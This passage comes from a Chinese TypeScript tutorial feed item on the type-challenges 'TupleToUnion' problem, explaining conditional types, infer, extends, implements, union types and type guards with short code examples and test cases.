<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-number">123</span>&gt;; <span class="hljs-comment">// false（不符合）</span>
</code></pre>
<p>分布式条件类型（联合类型专用）: 当 <code>T</code> 是联合类型时，<code>extends</code> 会自动拆分联合类型的每个成员，逐个判断后再合并结果。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Union</span> = <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> | <span class="hljs-built_in">boolean</span>;

<span class="hljs-comment">// 拆分逻辑：string→string，number→never，boolean→never → 合并为 string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">OnlyString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">OnlyString</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// Result = string</span>
</code></pre>
<p>注意：只有泛型参数是 裸类型（没有被 []/{} 包裹）时，才会触发分布式判断：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 包裹后不触发分布式，整体判断 [string|number] 是否兼容 [string]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NoDist</span>&lt;T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">string</span>] ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result2</span> = <span class="hljs-title class_">NoDist</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// never（整体不兼容）</span>
</code></pre>
<ol start="3">
<li>配合 <code>infer</code>：提取类型片段（黄金组合）</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 提取 Promise 的返回值类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UnwrapPromise</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer V&gt; ? V : T;

<span class="hljs-keyword">type</span> C = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;; <span class="hljs-comment">// string（提取成功）</span>
<span class="hljs-keyword">type</span> D = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-built_in">number</span>&gt;; <span class="hljs-comment">// number（不满足条件，返回原类型）</span>
</code></pre>
<h5 data-id="heading-6"><code>extends</code> 做继承（复用已有结构）</h5>
<ol>
<li>接口继承：复用 + 扩展属性</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 基础接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">// 继承 User，并扩展新属性</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span> | <span class="hljs-string">"super_admin"</span>; <span class="hljs-comment">// 新增权限属性</span>
}

<span class="hljs-comment">// 必须包含继承的 + 扩展的所有属性</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">admin</span>: <span class="hljs-title class_">Admin</span> = {
  <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">"张三"</span>,
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span>
};

<span class="hljs-comment">// 多接口继承</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">HasAge</span> { <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>; }
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span>, <span class="hljs-title class_">HasAge</span> {
  <span class="hljs-attr">className</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 同时继承 User + HasAge</span>
}
</code></pre>
<ol start="2">
<li>类继承：复用父类的属性 / 方法</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
}

<span class="hljs-comment">// 继承 Parent 类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> {
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">// 必须调用父类构造函数（初始化父类属性）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
  <span class="hljs-comment">// 重写父类方法</span>
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 调用父类原方法</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span> years old`</span>);
  }
}

<span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">"李四"</span>, <span class="hljs-number">10</span>);
child.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 输出：Hi, 李四 → I'm 10 years old</span>
</code></pre>
<p>补充：类实现接口用 <code>implements</code>（不是 <code>extends</code>）</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义接口（契约：规定必须有 id、name 属性，以及 greet 方法）</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">greet</span>(): <span class="hljs-built_in">void</span>; <span class="hljs-comment">// 仅定义方法签名，无实现</span>
}

<span class="hljs-comment">// 类实现接口（必须严格遵守契约）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-comment">// 必须实现接口的所有属性</span>
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-comment">// 构造函数初始化属性</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// 必须实现接口的 greet 方法（具体实现由类自己定义）</span>
  <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.id}</span>`</span>);
  }
}

<span class="hljs-comment">// 实例化使用</span>
<span class="hljs-keyword">const</span> emp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"张三"</span>);
emp.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// 输出：Hi, I'm 张三, ID: 1</span>


<span class="hljs-comment">// 接口1：基础信息</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Identifiable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// 接口2：可打印</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Printable</span> {
  <span class="hljs-title function_">printInfo</span>(): <span class="hljs-built_in">void</span>;
}

<span class="hljs-comment">// 类同时实现两个接口（必须实现所有接口的成员）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Identifiable</span>, <span class="hljs-title class_">Printable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 类可扩展接口外的属性</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// 实现 Identifiable 的方法</span>
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>;
  }

  <span class="hljs-comment">// 实现 Printable 的方法</span>
  <span class="hljs-title function_">printInfo</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Product: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getId()}</span>`</span>);
  }
}

<span class="hljs-keyword">const</span> product = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(<span class="hljs-number">100</span>, <span class="hljs-string">"手机"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(product.<span class="hljs-title function_">getId</span>()); <span class="hljs-comment">// 100</span>
product.<span class="hljs-title function_">printInfo</span>(); <span class="hljs-comment">// Product: 手机, ID: 100</span>
</code></pre>
<h4 data-id="heading-7"><code>infer</code></h4>
<p><code>infer</code> 是 TypeScript 在条件类型中提供的关键字，用于声明一个 <strong>待推导的类型变量</strong>（类似给类型起一个临时名字），只能在 <code>extends</code> 子句中使用。它的核心作用是：从已有类型中提取 / 推导我们需要的部分，而无需手动硬编码类型。</p>
<p><code>infer</code> 必须配合条件类型使用，语法结构如下：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 基础结构：推导 T 的类型为 U，若能推导则返回 U，否则返回 never</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">InferType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> infer U ? U : <span class="hljs-built_in">never</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Example</span> = <span class="hljs-title class_">InferType</span>&lt;<span class="hljs-built_in">string</span>&gt;; <span class="hljs-comment">// Example 类型为 string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Example2</span> = <span class="hljs-title class_">InferType</span>&lt;<span class="hljs-built_in">number</span>[]&gt;; <span class="hljs-comment">// Example2 类型为 number[]</span>
</code></pre>
<p>高频使用场景:</p>
<h5 data-id="heading-8">1. 提取函数的返回值类型</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义类型工具：提取函数的返回值类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetReturnType</span>&lt;<span class="hljs-title class_">Fn</span>&gt; = <span class="hljs-title class_">Fn</span> <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; infer R ? R : <span class="hljs-built_in">never</span>;

<span class="hljs-comment">// 测试用函数</span>
<span class="hljs-keyword">const</span> add = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> a + b;
<span class="hljs-keyword">const</span> <span class="hljs-title function_">getUser</span> = (<span class="hljs-params"/>) =&gt; ({ <span class="hljs-attr">name</span>: <span class="hljs-string">"张三"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> });

<span class="hljs-comment">// 使用类型工具</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">AddReturn</span> = <span class="hljs-title class_">GetReturnType</span>&lt;<span class="hljs-keyword">typeof</span> add&gt;; <span class="hljs-comment">// AddReturn 类型为 number</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UserReturn</span> = <span class="hljs-title class_">GetReturnType</span>&lt;<span class="hljs-keyword">typeof</span> getUser&gt;; <span class="hljs-comment">// UserReturn 类型为 { name: string; age: number }</span>
</code></pre>
<h5 data-id="heading-9">2. 提取数组的元素类型</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义类型工具：提取数组元素类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetArrayItem</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> (infer <span class="hljs-title class_">Item</span>)[] ? <span class="hljs-title class_">Item</span> : <span class="hljs-built_in">never</span>;

<span class="hljs-comment">// 测试</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NumberArray</span> = <span class="hljs-title class_">GetArrayItem</span>&lt;<span class="hljs-built_in">number</span>[]&gt;; <span class="hljs-comment">// NumberArray 类型为 number</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StringArray</span> = <span class="hljs-title class_">GetArrayItem</span>&lt;<span class="hljs-built_in">string</span>[]&gt;; <span class="hljs-comment">// StringArray 类型为 string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">MixedArray</span> = <span class="hljs-title class_">GetArrayItem</span>&lt;[<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>]&gt;; <span class="hljs-comment">// MixedArray 类型为 string | number</span>
</code></pre>
<h5 data-id="heading-10">3. 提取 Promise 的泛型参数类型</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义类型工具：提取 Promise 的泛型类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetPromiseValue</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer <span class="hljs-title class_">Value</span>&gt; ? <span class="hljs-title class_">Value</span> : <span class="hljs-built_in">never</span>;

<span class="hljs-comment">// 测试</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">PromiseString</span> = <span class="hljs-title class_">GetPromiseValue</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;; <span class="hljs-comment">// PromiseString 类型为 string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">PromiseUser</span> = <span class="hljs-title class_">GetPromiseValue</span>&lt;<span class="hljs-title class_">Promise</span>&lt;{ <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span> }&gt;&gt;; <span class="hljs-comment">// PromiseUser 类型为 { id: number }</span>
</code></pre>
<h5 data-id="heading-11">4. 提取函数的参数类型</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义类型工具：提取函数参数类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetFunctionParams</span>&lt;<span class="hljs-title class_">Fn</span>&gt; = <span class="hljs-title class_">Fn</span> <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: infer <span class="hljs-title class_">Params</span>) =&gt; <span class="hljs-built_in">any</span> ? <span class="hljs-title class_">Params</span> : <span class="hljs-built_in">never</span>;

<span class="hljs-comment">// 测试</span>
<span class="hljs-keyword">const</span> fn = (<span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {};
<span class="hljs-keyword">type</span> <span class="hljs-title class_">FnParams</span> = <span class="hljs-title class_">GetFunctionParams</span>&lt;<span class="hljs-keyword">typeof</span> fn&gt;; <span class="hljs-comment">// FnParams 类型为 [string, number]</span>

<span class="hljs-comment">// 进一步：提取第一个参数的类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">FirstParam</span> = <span class="hljs-title class_">GetFunctionParams</span>&lt;<span class="hljs-keyword">typeof</span> fn&gt;[<span class="hljs-number">0</span>]; <span class="hljs-comment">// FirstParam 类型为 string</span>
</code></pre>
<h4 data-id="heading-12"><code>|</code></h4>
<p><code>|</code> 运算符用于表示联合类型，即一个值可以是多个类型中的任意一个。</p>
<ol>
<li>变量的联合类型注解</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 变量 a 可以是字符串 OR 数字</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>;

<span class="hljs-comment">// 合法赋值（符合任意一种类型）</span>
a = <span class="hljs-string">"TS"</span>;
a = <span class="hljs-number">123</span>;

<span class="hljs-comment">// 非法赋值（不属于联合类型中的任何一种），TS 直接报错</span>
a = <span class="hljs-literal">true</span>; <span class="hljs-comment">// ❌ 类型 'boolean' 不能赋值给类型 'string | number'</span>
</code></pre>
<ol start="2">
<li>函数参数的联合类型</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 函数接收 string 或 number 类型的参数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printValue</span>(<span class="hljs-params">val: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(val);
}

<span class="hljs-comment">// 合法调用</span>
<span class="hljs-title function_">printValue</span>(<span class="hljs-string">"hello"</span>);
<span class="hljs-title function_">printValue</span>(<span class="hljs-number">666</span>);

<span class="hljs-comment">// 非法调用，TS 报错</span>
<span class="hljs-title function_">printValue</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// ❌</span>
</code></pre>
<ol start="3">
<li>数组的联合类型（注意两种写法的区别）</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 写法1：(A | B)[] —— 数组的「每个元素」可以是 A 或 B（混合数组）</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">arr1</span>: (<span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>)[] = [<span class="hljs-number">1</span>, <span class="hljs-string">"2"</span>, <span class="hljs-number">3</span>, <span class="hljs-string">"4"</span>]; <span class="hljs-comment">// 合法</span>

<span class="hljs-comment">// 写法2：A[] | B[] —— 「整个数组」要么全是 A 类型，要么全是 B 类型（纯数组）</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">arr2</span>: <span class="hljs-built_in">string</span>[] | <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]; <span class="hljs-comment">// 合法（全数字）</span>
arr2 = [<span class="hljs-string">"1"</span>, <span class="hljs-string">"2"</span>, <span class="hljs-string">"3"</span>]; <span class="hljs-comment">// 合法（全字符串）</span>
arr2 = [<span class="hljs-number">1</span>, <span class="hljs-string">"2"</span>]; <span class="hljs-comment">// ❌ 报错：混合类型不符合要求</span>
</code></pre>
<p>当使用联合类型的时候，访问某一个子类型的专属属性 / 方法时，需要进行类型守卫，可用的方法有 <code>typeof</code> 、<code>in</code> 、<code>switch</code> 、<code>instanceof</code> 。</p>
<ol>
<li><code>typeof</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getLength</span>(<span class="hljs-params">val: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-comment">// 类型窄化：判断 val 是 string 类型</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> val === <span class="hljs-string">"string"</span>) {
    <span class="hljs-comment">// 此分支中，TS 确定 val 是 string，可安全使用 length</span>
    <span class="hljs-keyword">return</span> val.<span class="hljs-property">length</span>;
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 此分支中，TS 确定 val 是 number，执行数字相关逻辑</span>
    <span class="hljs-keyword">return</span> val.<span class="hljs-title function_">toString</span>().<span class="hljs-property">length</span>;
  }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getLength</span>(<span class="hljs-string">"TS"</span>)); <span class="hljs-comment">// 2</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getLength</span>(<span class="hljs-number">1234</span>)); <span class="hljs-comment">// 4</span>
</code></pre>
<ol start="2">
<li><code>in</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">printUserInfo</span>(<span class="hljs-params">user: { name: <span class="hljs-built_in">string</span> } | { age: <span class="hljs-built_in">number</span> }</span>) {
  <span class="hljs-comment">// 类型窄化：判断 user 是否有 name 属性（即是否是 { name: string } 类型）</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-string">"name"</span> <span class="hljs-keyword">in</span> user) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Name: <span class="hljs-subst">${user.name}</span>`</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 此分支中，TS 确定 user 是 { age: number } 类型</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Age: <span class="hljs-subst">${user.age}</span>`</span>);
  }
}
</code></pre>
<ol start="3">
<li><code>switch</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">"user"</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
}
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Admin</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">"admin"</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">permission</span>: <span class="hljs-built_in">string</span>[];
}
<span class="hljs-comment">// 联合类型：可以是 User 或 Admin</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Person</span> = <span class="hljs-title class_">User</span> | <span class="hljs-title class_">Admin</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printPerson</span>(<span class="hljs-params">p: Person</span>) {
  <span class="hljs-keyword">switch</span> (p.<span class="hljs-property">type</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">"user"</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">age</span>); <span class="hljs-comment">// 确定是 User</span>
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"admin"</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">permission</span>); <span class="hljs-comment">// 确定是 Admin</span>
      <span class="hljs-keyword">break</span>;
  }
}
</code></pre>
<ol start="4">
<li><code>instanceof</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义两个类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> {
  <span class="hljs-title function_">bark</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"汪汪"</span>); }
}
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> {
  <span class="hljs-title function_">meow</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"喵喵"</span>); }
}

<span class="hljs-comment">// 联合类型：Dog 或 Cat 实例</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Animal</span> = <span class="hljs-title class_">Dog</span> | <span class="hljs-title class_">Cat</span>;

<span class="hljs-comment">// instanceof 类型守卫（针对类实例）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">animalCall</span>(<span class="hljs-params">animal: Animal</span>) {
  <span class="hljs-keyword">if</span> (animal <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Dog</span>) {
    animal.<span class="hljs-title function_">bark</span>();
  } <span class="hljs-keyword">else</span> {
    animal.<span class="hljs-title function_">meow</span>();
  }
}

<span class="hljs-title function_">animalCall</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>()); <span class="hljs-comment">// 汪汪</span>
<span class="hljs-title function_">animalCall</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>()); <span class="hljs-comment">// 喵喵</span>
</code></pre>
<h3 data-id="heading-13">测试用例</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ 测试用例 _____________ */</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Equal</span>, <span class="hljs-title class_">Expect</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@type-challenges/utils'</span>

<span class="hljs-keyword">type</span> cases = [
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToUnion</span>&lt;[<span class="hljs-number">123</span>, <span class="hljs-string">'456'</span>, <span class="hljs-literal">true</span>]&gt;, <span class="hljs-number">123</span> | <span class="hljs-string">'456'</span> | <span class="hljs-literal">true</span>&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToUnion</span>&lt;[<span class="hljs-number">123</span>]&gt;, <span class="hljs-number">123</span>&gt;&gt;,
]

</code></pre>
<h3 data-id="heading-14">相关链接</h3>
<blockquote>
<p>分享你的解答：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F10%2Fanswer%2Fzh-CN" target="_blank" title="https://tsch.js.org/10/answer/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/10/answer/z…</a>
查看解答：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F10%2Fsolutions" target="_blank" title="https://tsch.js.org/10/solutions" ref="nofollow noopener noreferrer">tsch.js.org/10/solution…</a>
更多题目：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2Fzh-CN" target="_blank" title="https://tsch.js.org/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/zh-CN</a></p>
</blockquote>
<p>下面是我的公众号，欢迎关注。关注后有新的功能点会及时收到推送。</p>
<blockquote>
<p>实战为王！专注于汇总各种功能点，致力于打造一系列能够帮助工程师实现各种功能的想法思路的优质文章。</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bdeec99a0154e7aa73c1c6765f3dcf0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZnhzcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390836&amp;x-signature=Ml919VoDzxim80t0Nxp2fWwDcdA%3D" alt="前端功能点" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[type-challenges（ts类型体操）: 11 - 元组转换为对象]]></title>    <link>https://juejin.cn/post/7600955777316274214</link>    <guid>https://juejin.cn/post/7600955777316274214</guid>    <pubDate>2026-01-30T15:20:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777316274214" data-draft-id="7600953879501275187" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="type-challenges（ts类型体操）: 11 - 元组转换为对象"/> <meta itemprop="keywords" content="TypeScript"/> <meta itemprop="datePublished" content="2026-01-30T15:20:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="fxss"/> <meta itemprop="url" content="https://juejin.cn/user/3702810892856808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            type-challenges（ts类型体操）: 11 - 元组转换为对象
